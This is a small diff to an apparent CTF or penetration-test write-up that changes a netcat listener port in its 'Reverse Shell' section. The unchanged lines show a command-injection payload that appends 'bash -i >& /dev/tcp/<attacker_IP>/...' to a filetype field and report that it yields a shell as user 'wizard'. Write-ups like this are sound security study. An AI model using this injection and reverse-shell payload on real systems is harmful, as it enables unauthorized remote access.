@@ -74,7 +74,7 @@ Response time increased by ~5 seconds, confirming execution of system command.
 
 ### Reverse Shell
 Payload: filetype=jpg;bash -i >& /dev/tcp/<attacker_IP>/<attacker_port> 0>&1  
-Listener: nc -lvnp 4444  
+Listener: nc -lvnp 9001  
 Result: reverse shell as user wizard.  
 
 *Figure 5 – Reverse shell established as wizard*
